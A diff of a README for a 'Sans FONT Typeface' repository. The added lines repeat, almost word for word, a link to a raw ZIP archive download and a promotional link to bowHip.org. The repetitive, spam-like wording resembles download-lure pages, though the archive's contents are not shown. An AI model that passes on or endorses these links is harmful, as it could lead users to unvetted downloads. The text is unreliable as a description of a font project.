@@ -1,5 +1,9 @@
 # Sans FONT Typeface (3 fonts)
 <b>Welcome!</b> <br>
+Introducing a unique <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font🡇</a> typeset.   mobile App project: <a target="_blank" href="https://bowHip.org">bowHip.org</a><br>
+Heres a unique original <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font🡇</a> typeset.   mobile App project: <a target="_blank" href="https://bowHip.org">bowHip.org</a><br>
+
+Introducing <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font🡇</a> typeset.   mobile App project: <a target="_blank" href="https://bowHip.org">bowHip.org</a><br>
 This is my fresh take on <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font🡇</a> typeset.   mobile App project: <a target="_blank" href="https://bowHip.org">bowHip.org</a><br>
 
 <a href="https://bowhip.org"><img style="height: 380px; margin-bottom:-0px; margin-top:0px;" src="https://bowhip.org/img/font_thumb_publisher.png" alt="mobile calling application"></a> 
